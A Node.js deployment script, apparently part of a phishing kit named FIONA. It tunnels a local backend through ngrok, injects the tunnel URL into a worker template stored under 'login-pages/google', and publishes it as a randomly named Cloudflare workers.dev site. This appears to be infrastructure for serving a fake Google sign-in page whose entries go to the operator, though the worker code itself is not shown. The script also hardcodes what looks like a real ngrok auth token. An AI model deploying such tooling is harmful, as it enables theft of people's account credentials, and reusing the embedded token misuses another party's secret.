#!/usr/bin/env node

/**
 * deploy-local.js
 * 
 * Local testing script for Cloudflare Worker deployment
 * 
 * Features:
 * 1. Authenticates ngrok
 * 2. Starts ngrok tunnel to expose local backend
 * 3. Reads worker.js template
 * 4. Replaces __BACKEND_URL__ with ngrok URL
 * 5. Uploads worker to Cloudflare (no env bindings)
 * 6. Enables workers.dev subdomain
 * 7. Saves CF-assigned worker name to .env.local
 * 
 * Usage:
 *   npm run dev:cf
 * 
 * Prerequisites:
 *   - ngrok installed: https://ngrok.com/download
 *   - CF_API_TOKEN in .env
 *   - CF_ACCOUNT_ID in .env
 *   - NGROK_AUTHTOKEN in .env (optional, hardcoded fallback exists)
 */

// Load .env from backend directory
require('dotenv').config({ path: require('path').resolve(__dirname, '../.env') });

const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');

const CF_API_TOKEN = process.env.CF_API_TOKEN || process.env.CLOUDFLARE_API_TOKEN;
const CF_ACCOUNT_ID = process.env.CF_ACCOUNT_ID || process.env.CLOUDFLARE_ACCOUNT_ID;

// Get port from args or default to 8000
const args = process.argv.slice(2);
const portIndex = args.indexOf('--port');
const BACKEND_PORT = portIndex !== -1 ? parseInt(args[portIndex + 1]) : 8000;

if (!CF_API_TOKEN || !CF_ACCOUNT_ID) {
  console.error('❌ Missing CF_API_TOKEN or CF_ACCOUNT_ID in .env');
  process.exit(1);
}

// Check if ngrok is installed
try {
  execSync('ngrok version', { stdio: 'ignore' });
} catch {
  console.error('❌ ngrok not found. Install from: https://ngrok.com/download');
  process.exit(1);
}

// Check for ngrok auth token
const NGROK_TOKEN = process.env.NGROK_AUTHTOKEN || '3LdyTAQ54IueZIgiIsFyru5vzxK_724yviHKeQpgxcYNG58hU';

console.log('🚀 FIONA Local CF Worker Deployment\n');

async function main() {
  // Step 1: Authenticate ngrok
  console.log('[1/6] Configuring ngrok...');
  try {
    execSync(`ngrok config add-authtoken ${NGROK_TOKEN}`, { stdio: 'ignore' });
    console.log('✅ ngrok authenticated\n');
  } catch (err) {
    console.error('⚠️  ngrok auth warning (may already be configured)\n');
  }
  
  // Step 2: Start ngrok tunnel
  console.log(`[2/6] Starting ngrok tunnel on port ${BACKEND_PORT}...`);
  
  const tunnel = spawn('ngrok', ['http', BACKEND_PORT.toString()], {
    stdio: ['ignore', 'ignore', 'ignore'],
    shell: true,
    detached: false,
  });

  let tunnelUrl = '';
  
  // Wait for ngrok to start and query its API
  async function getTunnelUrl() {
    const axios = require('axios');
    const maxAttempts = 30; // 30 seconds
    
    for (let i = 0; i < maxAttempts; i++) {
      try {
        await new Promise(r => setTimeout(r, 1000)); // Wait 1 second
        const response = await axios.get('http://127.0.0.1:4040/api/tunnels');
        
        if (response.data && response.data.tunnels && response.data.tunnels.length > 0) {
          const httpsTunnel = response.data.tunnels.find(t => t.public_url.startsWith('https://'));
          if (httpsTunnel) {
            return httpsTunnel.public_url;
          }
        }
      } catch (err) {
        // ngrok API not ready yet, continue loop
      }
    }
    
    throw new Error('ngrok tunnel timed out');
  }
  
  tunnelUrl = await getTunnelUrl();
  console.log(`✅ ngrok tunnel active: ${tunnelUrl}\n`);

  // Step 3: Read worker.js template
  console.log('[3/6] Reading worker.js template...');
  const workerPath = path.resolve(__dirname, '../login-pages/google/worker.js');
  
  if (!fs.existsSync(workerPath)) {
    console.error(`❌ worker.js not found at: ${workerPath}`);
    tunnel.kill();
    process.exit(1);
  }

  let workerScript = fs.readFileSync(workerPath, 'utf-8');
  console.log('✅ Template loaded\n');

  // Step 4: Replace __BACKEND_URL__ with tunnel URL
  console.log('[4/6] Injecting tunnel URL into worker...');
  workerScript = workerScript.replace(/__BACKEND_URL__/g, tunnelUrl);
  console.log('✅ BACKEND_URL injected\n');

  // Step 5: Upload to Cloudflare
  console.log('[5/6] Uploading worker to Cloudflare...');
  
  const FormData = require('form-data');
  const axios = require('axios');
  const crypto = require('crypto');
  
  const workerName = `fiona-local-${crypto.randomBytes(4).toString('hex')}`;
  
  const form = new FormData();
  
  // Metadata - NO env bindings
  const metadata = {
    main_module: 'worker.js',
    bindings: [],
    compatibility_date: '2024-09-23',
  };
  
  form.append('metadata', JSON.stringify(metadata), {
    contentType: 'application/json',
  });
  
  // Worker script
  form.append('worker.js', workerScript, {
    contentType: 'application/javascript+module',
    filename: 'worker.js',
  });

  try {
    const response = await axios.put(
      `https://api.cloudflare.com/client/v4/accounts/${CF_ACCOUNT_ID}/workers/scripts/${workerName}`,
      form,
      {
        headers: {
          'Authorization': `Bearer ${CF_API_TOKEN}`,
          ...form.getHeaders(),
        },
      }
    );

    if (!response.data.success) {
      throw new Error(response.data.errors?.[0]?.message || 'Worker upload failed');
    }

    console.log(`✅ Worker deployed: ${workerName}\n`);

    // Enable workers.dev subdomain
    console.log('Enabling workers.dev subdomain...');
    try {
      const subdomainRes = await axios.post(
        `https://api.cloudflare.com/client/v4/accounts/${CF_ACCOUNT_ID}/workers/scripts/${workerName}/subdomain`,
        { enabled: true },
        {
          headers: {
            'Authorization': `Bearer ${CF_API_TOKEN}`,
            'Content-Type': 'application/json',
          },
        }
      );
      
      if (subdomainRes.data.success) {
        console.log('✅ workers.dev subdomain enabled\n');
      }
    } catch (err) {
      console.warn('⚠️  workers.dev subdomain may already be enabled\n');
    }

    // Step 6: Save worker name to .env.local
    console.log('[6/6] Saving worker name to .env.local...');
    const envPath = path.resolve(__dirname, '../.env.local');
    const envContent = `# Local CF Worker for testing\nCF_LOCAL_WORKER_NAME=${workerName}\nCF_LOCAL_TUNNEL_URL=${tunnelUrl}\n`;
    fs.writeFileSync(envPath, envContent);
    console.log('✅ Saved to .env.local\n');

    // Get account subdomain for correct workers.dev URL
    let workerUrl = `https://${workerName}.workers.dev`;
    try {
      const subdomainInfo = await axios.get(
        `https://api.cloudflare.com/client/v4/accounts/${CF_ACCOUNT_ID}/workers/subdomain`,
        {
          headers: {
            'Authorization': `Bearer ${CF_API_TOKEN}`,
          },
        }
      );
      
      if (subdomainInfo.data.success && subdomainInfo.data.result?.subdomain) {
        const accountSubdomain = subdomainInfo.data.result.subdomain;
        workerUrl = `https://${workerName}.${accountSubdomain}.workers.dev`;
      }
    } catch (err) {
      // Fallback to basic URL if can't get subdomain
    }

    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('✨ Local deployment complete!\n');
    console.log(`Worker Name:  ${workerName}`);
    console.log(`Backend URL:  ${tunnelUrl}`);
    console.log(`Worker URL:   ${workerUrl}`);
    console.log('\n💡 To attach a Custom Domain, use the Cloudflare dashboard or API.');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    // Keep ngrok tunnel running
    console.log('🔄 ngrok tunnel is running. Press Ctrl+C to stop.\n');
    
    process.on('SIGINT', () => {
      console.log('\n🛑 Stopping cloudflared tunnel...');
      tunnel.kill();
      process.exit(0);
    });

  } catch (error) {
    console.error('❌ Cloudflare worker upload failed:', error.response?.data || error.message);
    tunnel.kill();
    process.exit(1);
  }
}

main().catch((error) => {
  console.error('❌ Script failed:', error.message);
  process.exit(1);
});
